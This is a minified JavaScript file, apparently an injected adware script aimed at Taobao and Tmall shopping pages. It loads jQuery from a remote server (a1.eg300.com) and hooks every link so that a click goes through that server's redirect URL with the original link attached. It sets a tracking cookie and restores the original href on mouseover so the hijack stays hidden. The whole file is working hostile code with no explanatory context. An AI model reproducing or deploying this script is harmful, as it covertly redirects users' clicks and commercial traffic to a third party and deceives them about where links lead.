(function(){if("undefined"!==typeof A1eg300){return};window.A1eg300=A1eg300={server:"http://a1.eg300.com/",jQuery:"js/jquery-1.8.3.min.js",params:{"isLinkConverted":false},keys:{"userLinkConvert":"userLinkConvert"},SITE_PATTERN:{"^(http|https)://www\.(taobao|tmall)\.com/":"tb","^(http|https)://*/*":"other"},util:{A:function(a,b){if(typeof b=="string"){a.innerHTML=b}else{a.appendChild(b)};return b},C:function(a){return document.createElement(a)},T:function(a,b){return document.getElementsByTagName(a)[b]},addScript:function(a,b,c){var d=A1eg300.util.T("head",0);var e=A1eg300.util.C("script");e.type="text/javascript";e.charset="utf-8";if(b){e.text=a}else{var f=new Date();e.src=a+"?t="+f.getFullYear()+f.getMonth()+f.getDate();e.onload=e.onreadystatechange=function(){if(e.readyState&&e.readyState!="loaded"&&e.readyState!="complete"){return}else{if(c){c()};e.onload=e.onreadystatechange=null}}};A1eg300.util.A(d,e);if(b&&c){c()}},addCss:function(a,b){var c,d=A1eg300.util.T("head",0);if(b){c=A1eg300.util.C("stlye");c.type="text/css";c.text=a}else{var e=new Date();c=A1eg300.util.C("link");c.rel="stylesheet";c.href=a+"?t="+e.getFullYear()+e.getMonth()+e.getDate()};A1eg300.util.A(d,c)},loadJQuery:function(a,b,c){if(typeof(jQuery)=="undefined"){A1eg300.util.addScript(A1eg300.server+A1eg300.jQuery,false,function(){try{jQuery.noConflict();A1eg300.$=jQuery;c(a,b)}catch(e){A1eg300.util.addScript(A1eg300.server+A1eg300.JQUERY,false,function(){jQuery.noConflict();A1eg300.$=jQuery;c(a,b)})}})}else{A1eg300.$=jQuery;c(a,b)}},getRandomNum:function(a,b){var c=b-a;var d=Math.random();return(a+Math.round(d*c))},jsonp:function(a,b,c){A1eg300.$.ajax({"url":A1eg300.server+a,"data":b,"dataType":"jsonp","jsonp":"callback","async":false,"success":function(d){if("undefined"!==typeof c){c(d)}}})}},api:{setCookie:function(a,b,c,d){var e="api/cookie/";var f={"key":a,"val":b,"expire":c};A1eg300.util.jsonp(e,f,d)},getCookie:function(a,b){var c="api/cookie/";var d={"key":a,"op":"get"};A1eg300.util.jsonp(c,d,b)},removeCookie:function(a,b){expire=-1;A1eg300.util.jsonp(a,null,expire,b)}},getUrlType:function(a){for(var b in A1eg300.SITE_PATTERN){var c=a.match(new RegExp(b,"i"));if(c){var d={"site":A1eg300.SITE_PATTERN[b],"key":c[2]||[]};return d}};return false},injectHtml:function(a,b){switch(b.site){case"tb":A1eg300.linkConvert();break;default:break}},linkConvertProbability:function(){var a=31;var b=10;var c=new Date().getMilliseconds();var d=c%a;var e=A1eg300.util.getRandomNum(0,a-1);d=Math.round(d/b);e=Math.round(e/b);if(d==e){return true}else{return false}},linkConvertParams:function(a,b){var c="api/linkparam/";var d={"key":a,"op":"get"};A1eg300.util.jsonp(c,d,b)},linkConvert:function(){var a=true;if(a){var b=A1eg300.keys.userLinkConvert;A1eg300.linkConvertParams(b,function(c){var d=c.result;if(!!d){var e=false;if(!!c[b]){A1eg300.params.isLinkConverted=true};if(!A1eg300.params.isLinkConverted){e=true};if(e){var f=c.redirectUrl;A1eg300.$("a").each(function(){var g=A1eg300.$(this);var h=A1eg300.$(this).attr("href");g.click(function(){if(!A1eg300.params.isLinkConverted&&"undefined"!==typeof h&&""!==h&&null!==h){f+="?r=taobao&link="+encodeURIComponent(h);A1eg300.$(this).attr("href",f);var i=true;var j=7*24*3600;A1eg300.api.setCookie(b,i,j,function(){A1eg300.params.isLinkConverted=true;A1eg300.$(this).attr("href",h)})}}).mouseover(function(){var i=A1eg300.$(this).attr("href");if(f===i){A1eg300.$(this).attr("href",h)}})})}}})}},afterJQueryLoaded:function(a,b){A1eg300.injectHtml(a,b)},init:function(a){a=a.toLowerCase();var b=A1eg300.getUrlType(a);if(b&&"other"!==b.site){A1eg300.util.loadJQuery(a,b,A1eg300.afterJQueryLoaded)}}};A1eg300.init(document.location.href)})();
